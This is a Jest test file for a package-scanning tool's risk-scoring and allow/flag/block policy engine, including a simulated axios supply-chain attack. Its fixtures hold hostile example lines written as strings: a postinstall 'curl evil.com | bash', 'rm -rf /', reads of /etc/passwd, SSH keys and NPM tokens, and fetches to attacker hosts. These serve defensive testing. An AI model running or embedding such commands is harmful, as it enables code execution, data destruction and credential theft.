/**
 * ═══════════════════════════════════════════════════════════
 *  AEGIS-AST — P3 Module Tests
 *  Tests for: risk_engine.ts, policy.ts, logger.ts
 * ═══════════════════════════════════════════════════════════
 */

import {
  calculateFullRisk,
  calculateRisk,
  WEIGHTS,
  FullScanInput,
  ScannerOutput,
} from '../src/core/risk_engine';
import {
  decide,
  applyFullPolicy,
  applyPolicy,
  THRESHOLDS,
} from '../src/core/policy';

// ─── Helpers ────────────────────────────────────────────────

/** Returns a clean ScannerOutput with no findings */
function emptyScannerOutput(): ScannerOutput {
  return { scripts: [], network: [], entropy: [], fs: [], exec: [], eval: [] };
}

/** Returns a FullScanInput with no findings */
function cleanInput(name: string = 'clean-pkg'): FullScanInput {
  return {
    packageName: name,
    packageVersion: '1.0.0',
    phantomDeps: [],
    scannerOutput: emptyScannerOutput(),
  };
}

// ═════════════════════════════════════════════════════════════
//  RISK ENGINE TESTS
// ═════════════════════════════════════════════════════════════

describe('Risk Engine — calculateFullRisk', () => {

  it('should score 0 for a completely clean package', () => {
    const result = calculateFullRisk(cleanInput());
    expect(result.total).toBe(0);
    expect(result.breakdown.phantom).toBe(0);
    expect(result.breakdown.scripts).toBe(0);
    expect(result.breakdown.exec).toBe(0);
    expect(result.breakdown.eval).toBe(0);
    expect(result.breakdown.network).toBe(0);
    expect(result.breakdown.fs).toBe(0);
    expect(result.breakdown.entropy).toBe(0);
    expect(result.breakdown.gemini).toBe(0);
    expect(result.breakdown.phantomPackages).toBe(0);
    expect(result.phantomDetails).toEqual([]);
  });

  it('should add +50 when phantom deps exist', () => {
    const input = cleanInput();
    input.phantomDeps = ['evil-pkg'];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.phantom); // 50
    expect(result.breakdown.phantom).toBe(50);
  });

  it('should add +40 when suspicious scripts are found', () => {
    const input = cleanInput();
    input.scannerOutput.scripts = [
      'postinstall: curl http://evil.com | bash — contains curl, bash',
    ];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.scripts); // 40
    expect(result.breakdown.scripts).toBe(40);
  });

  it('should add +35 for exec findings', () => {
    const input = cleanInput();
    input.scannerOutput.exec = [
      'lib/setup.js:3 — exec("rm -rf /") — contains exec',
    ];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.exec); // 35
    expect(result.breakdown.exec).toBe(35);
  });

  it('should add +30 for eval findings', () => {
    const input = cleanInput();
    input.scannerOutput.eval = [
      'lib/index.js:5 — eval(payload) — contains eval',
    ];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.eval); // 30
    expect(result.breakdown.eval).toBe(30);
  });

  it('should add +25 for network and +25 for fs findings', () => {
    const input = cleanInput();
    input.scannerOutput.network = ['lib/index.js:1 — fetch("http://evil.com")'];
    input.scannerOutput.fs = ['lib/index.js:2 — readFileSync("/etc/passwd")'];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.network + WEIGHTS.fs); // 50
    expect(result.breakdown.network).toBe(25);
    expect(result.breakdown.fs).toBe(25);
  });

  it('should add +20 for entropy findings', () => {
    const input = cleanInput();
    input.scannerOutput.entropy = ['lib/index.js:1 — entropy 6.84 — "aGVsbG8..."'];
    const result = calculateFullRisk(input);
    expect(result.total).toBe(WEIGHTS.entropy); // 20
    expect(result.breakdown.entropy).toBe(20);
  });

  it('should NOT cap at 100 — full malicious package can exceed it', () => {
    const input: FullScanInput = {
      packageName: 'axios',
      packageVersion: '1.14.1',
      phantomDeps: ['plain-crypto-js'],
      scannerOutput: emptyScannerOutput(), // parent has no direct signals
      phantomScanResults: [{
        packageName: 'plain-crypto-js',
        packageVersion: '4.2.1',
        scannerOutput: {
          scripts: ['postinstall: node setup.js'],
          exec: ['setup.js:5 — child_process.exec()'],
          eval: ['setup.js:8 — Function()'],
          network: ['setup.js:12 — sfrclak.com'],
          fs: ['setup.js:15 — ~/.ssh, process.env'],
          entropy: ['setup.js:20 — entropy 7.2'],
        },
      }],
    };
    const result = calculateFullRisk(input);

    // phantom(50) + phantom pkg signals(40+35+30+25+25+20 = 175) = 225
    expect(result.total).toBe(225);
    expect(result.total).toBeGreaterThan(100);
    expect(result.breakdown.phantom).toBe(50);
    expect(result.breakdown.phantomPackages).toBe(175);
    expect(result.phantomDetails).toHaveLength(1);
    expect(result.phantomDetails[0].packageName).toBe('plain-crypto-js');
    expect(result.phantomDetails[0].score).toBe(175);
  });

  it('should add Gemini score when typosquat is detected', () => {
    const input = cleanInput();
    input.phantomDeps = ['evil-pkg'];
    input.gemini = {
      typosquat: {
        verdict: 'typosquat',
        confidence: 0.95,
        reasoning: 'Similar to "evil-package"',
      },
    };
    const result = calculateFullRisk(input);
    // phantom(50) + gemini_malicious(30) = 80
    expect(result.total).toBe(80);
    expect(result.breakdown.gemini).toBe(30);
  });

  it('should NOT add Gemini score when verdict is legitimate', () => {
    const input = cleanInput();
    input.gemini = {
      typosquat: {
        verdict: 'legitimate',
        confidence: 0.99,
        reasoning: 'Well-known package',
      },
    };
    const result = calculateFullRisk(input);
    expect(result.total).toBe(0);
    expect(result.breakdown.gemini).toBe(0);
  });

  it('should handle undefined/null scannerOutput defensively', () => {
    const input: FullScanInput = {
      packageName: 'broken-pkg',
      packageVersion: '1.0.0',
      phantomDeps: [],
      scannerOutput: undefined as any,
    };
    const result = calculateFullRisk(input);
    expect(result.total).toBe(0);
  });

  it('should handle partial scannerOutput defensively', () => {
    const input: FullScanInput = {
      packageName: 'partial-pkg',
      packageVersion: '1.0.0',
      phantomDeps: ['ghost'],
      scannerOutput: { exec: ['found exec'] } as any,
    };
    const result = calculateFullRisk(input);
    // phantom(50) + exec(35) = 85
    expect(result.total).toBe(85);
  });
});

// ═════════════════════════════════════════════════════════════
//  RISK ENGINE — backward-compat wrapper
// ═════════════════════════════════════════════════════════════

describe('Risk Engine — calculateRisk (backward compat)', () => {

  it('should return standard RiskScore shape', () => {
    const result = calculateRisk({
      packageName: 'test',
      packageVersion: '1.0.0',
      comparator: { usedDependencies: [], phantom: ['ghost'], missing: [] },
      security: {
        scripts: [],
        network: [],
        entropy: [],
        fs: [],
        exec: [{ filePath: 'a.js', line: 1, match: 'exec()', type: 'exec' }],
        eval: [],
      },
    });

    expect(result.total).toBe(85); // phantom(50) + exec(35)
    expect(result.breakdown).toHaveProperty('phantom');
    expect(result.breakdown).toHaveProperty('scripts');
    expect(result.breakdown).toHaveProperty('exec');
    expect(result.breakdown).toHaveProperty('eval');
    expect(result.breakdown).toHaveProperty('network');
    expect(result.breakdown).toHaveProperty('entropy');
    expect(result.breakdown).toHaveProperty('fs');
    // Should NOT have gemini or phantomPackages in standard shape
    expect(result.breakdown).not.toHaveProperty('gemini');
    expect(result.breakdown).not.toHaveProperty('phantomPackages');
  });
});

// ═════════════════════════════════════════════════════════════
//  POLICY ENGINE TESTS
// ═════════════════════════════════════════════════════════════

describe('Policy Engine — decide()', () => {

  it('should ALLOW scores <= 40', () => {
    expect(decide(0)).toBe('ALLOW');
    expect(decide(20)).toBe('ALLOW');
    expect(decide(40)).toBe('ALLOW');
  });

  it('should FLAG scores 41-70', () => {
    expect(decide(41)).toBe('FLAG');
    expect(decide(55)).toBe('FLAG');
    expect(decide(70)).toBe('FLAG');
  });

  it('should BLOCK scores > 70', () => {
    expect(decide(71)).toBe('BLOCK');
    expect(decide(100)).toBe('BLOCK');
    expect(decide(255)).toBe('BLOCK');
  });

  it('should match configured thresholds', () => {
    expect(THRESHOLDS.BLOCK).toBe(70);
    expect(THRESHOLDS.FLAG).toBe(40);
  });
});

describe('Policy Engine — applyFullPolicy()', () => {

  it('should return ALLOW with no issues for clean package', () => {
    const input = cleanInput();
    const riskScore = calculateFullRisk(input);
    const policy = applyFullPolicy(riskScore, input);

    expect(policy.decision).toBe('ALLOW');
    expect(policy.score).toBe(0);
    expect(policy.reasons).toContain('✅ No security issues detected.');
  });

  it('should return BLOCK with reasons for malicious package', () => {
    const input: FullScanInput = {
      packageName: 'evil-pkg',
      packageVersion: '1.0.0',
      phantomDeps: ['crypto-stealer'],
      scannerOutput: {
        scripts: ['postinstall: curl evil.com | bash'],
        exec: ['setup.js:1 — exec("steal()")'],
        eval: [],
        network: ['setup.js:5 — http://evil.com'],
        fs: ['setup.js:8 — /etc/passwd'],
        entropy: [],
      },
    };
    const riskScore = calculateFullRisk(input);
    const policy = applyFullPolicy(riskScore, input);

    expect(policy.decision).toBe('BLOCK');
    expect(policy.score).toBeGreaterThan(70);
    expect(policy.reasons.length).toBeGreaterThan(0);
    // Should mention phantom deps
    expect(policy.reasons.some(r => r.includes('Phantom'))).toBe(true);
    // Should mention scripts
    expect(policy.reasons.some(r => r.includes('install scripts'))).toBe(true);
  });

  it('should include phantom package sub-scores in reasons', () => {
    const input: FullScanInput = {
      packageName: 'compromised',
      packageVersion: '1.0.0',
      phantomDeps: ['shadow-dep'],
      scannerOutput: emptyScannerOutput(),
      phantomScanResults: [{
        packageName: 'shadow-dep',
        packageVersion: '1.0.0',
        scannerOutput: {
          scripts: [], network: [], entropy: [],
          fs: ['reading /etc/passwd'], exec: ['exec("id")'], eval: [],
        },
      }],
    };
    const riskScore = calculateFullRisk(input);
    const policy = applyFullPolicy(riskScore, input);

    expect(policy.reasons.some(r => r.includes('shadow-dep'))).toBe(true);
    expect(policy.reasons.some(r => r.includes('scored'))).toBe(true);
  });

  it('should include Gemini reasons when flagged', () => {
    const input: FullScanInput = {
      packageName: 'typo-pkg',
      packageVersion: '1.0.0',
      phantomDeps: ['ghost'],
      scannerOutput: emptyScannerOutput(),
      gemini: {
        typosquat: {
          verdict: 'typosquat',
          confidence: 0.92,
          reasoning: 'Looks like a typo of "popular-pkg"',
        },
        script: {
          verdict: 'malicious',
          risk_level: 'critical',
          techniques: ['base64 obfuscation', 'shell execution'],
          reasoning: 'Hidden payload detected',
        },
      },
    };
    const riskScore = calculateFullRisk(input);
    const policy = applyFullPolicy(riskScore, input);

    expect(policy.reasons.some(r => r.includes('Gemini'))).toBe(true);
    expect(policy.reasons.some(r => r.includes('typosquat'))).toBe(true);
  });
});

describe('Policy Engine — applyPolicy (backward compat)', () => {

  it('should work with old RiskInput format', () => {
    const riskScore = calculateRisk({
      packageName: 'old-style',
      packageVersion: '1.0.0',
      comparator: { usedDependencies: [], phantom: [], missing: [] },
      security: {
        scripts: [], network: [], entropy: [],
        fs: [], exec: [], eval: [],
      },
    });
    const policy = applyPolicy(riskScore, {
      packageName: 'old-style',
      packageVersion: '1.0.0',
      comparator: { usedDependencies: [], phantom: [], missing: [] },
      security: {
        scripts: [], network: [], entropy: [],
        fs: [], exec: [], eval: [],
      },
    });

    expect(policy.decision).toBe('ALLOW');
    expect(policy.score).toBe(0);
  });
});

// ═════════════════════════════════════════════════════════════
//  WEIGHTS VERIFICATION
// ═════════════════════════════════════════════════════════════

describe('Weights Configuration', () => {

  it('should match the spec exactly', () => {
    expect(WEIGHTS.phantom).toBe(50);
    expect(WEIGHTS.scripts).toBe(40);
    expect(WEIGHTS.exec).toBe(35);
    expect(WEIGHTS.eval).toBe(30);
    expect(WEIGHTS.network).toBe(25);
    expect(WEIGHTS.fs).toBe(25);
    expect(WEIGHTS.entropy).toBe(20);
    expect(WEIGHTS.gemini_malicious).toBe(30);
  });

  it('should have a max possible score of 255 (all signals + gemini)', () => {
    // phantom(50) + scripts(40) + exec(35) + eval(30) + network(25) + fs(25) + entropy(20) + gemini(30+30) = 285
    // But gemini_malicious usually only fires once for typosquat OR script
    // Realistic max with all signals + 1 gemini = 50+40+35+30+25+25+20+30 = 255
    const allSignals = WEIGHTS.phantom + WEIGHTS.scripts + WEIGHTS.exec +
      WEIGHTS.eval + WEIGHTS.network + WEIGHTS.fs + WEIGHTS.entropy +
      WEIGHTS.gemini_malicious;
    expect(allSignals).toBe(255);
  });
});

// ═════════════════════════════════════════════════════════════
//  FULL AXIOS RAT SIMULATION
// ═════════════════════════════════════════════════════════════

describe('Axios RAT Attack Simulation', () => {

  it('should detect and BLOCK the axios supply-chain attack', () => {
    // Simulates the exact axios@1.14.1 attack scenario
    const input: FullScanInput = {
      packageName: 'axios',
      packageVersion: '1.14.1',
      ecosystem: 'npm',
      phantomDeps: ['plain-crypto-js'],
      scannerOutput: emptyScannerOutput(), // parent is clean
      phantomScanResults: [{
        packageName: 'plain-crypto-js',
        packageVersion: '4.2.1',
        scannerOutput: {
          scripts: ['postinstall: node setup.js — contains node-eval'],
          exec: [
            'setup.js:12 — child_process.exec(deobfuscated) — contains child_process, exec',
          ],
          eval: [
            'setup.js:8 — new Function(decoded) — contains new Function',
          ],
          network: [
            'setup.js:15 — fetch("https://sfrclak.com/data") — contains http, fetch',
          ],
          fs: [
            'setup.js:20 — readFileSync(os.homedir() + "/.ssh/id_rsa") — contains .ssh/id_rsa',
            'setup.js:22 — process.env.NPM_TOKEN — contains process.env',
          ],
          entropy: [
            'setup.js:5 — entropy 7.21 — "xKp2$mQ7@nR..."',
          ],
        },
        gemini: {
          script: {
            verdict: 'malicious',
            risk_level: 'critical',
            techniques: ['XOR obfuscation', 'credential theft', 'C2 communication'],
            reasoning: 'Script downloads and executes remote payload after deobfuscating XOR-encoded strings',
          },
        },
      }],
      gemini: {
        typosquat: {
          verdict: 'typosquat',
          confidence: 0.97,
          reasoning: '"plain-crypto-js" mimics "crypto-js" which has 10M+ weekly downloads',
        },
      },
    };

    const riskScore = calculateFullRisk(input);
    const policy = applyFullPolicy(riskScore, input);

    // Verify scoring
    expect(riskScore.breakdown.phantom).toBe(50);
    expect(riskScore.breakdown.gemini).toBe(30); // typosquat on parent
    expect(riskScore.phantomDetails[0].score).toBe(175 + 30); // all signals + malicious gemini on phantom
    expect(riskScore.total).toBeGreaterThan(200);

    // Verify decision
    expect(policy.decision).toBe('BLOCK');

    // Verify reasons mention the attack
    expect(policy.reasons.some(r => r.includes('plain-crypto-js'))).toBe(true);
    expect(policy.reasons.some(r => r.includes('Phantom'))).toBe(true);
    expect(policy.reasons.some(r => r.includes('Gemini'))).toBe(true);

    console.log('\n═══ AXIOS RAT SIMULATION ═══');
    console.log(`Score: ${riskScore.total}`);
    console.log(`Decision: ${policy.decision}`);
    console.log('Reasons:');
    for (const reason of policy.reasons) {
      console.log(`  ${reason}`);
    }
  });
});
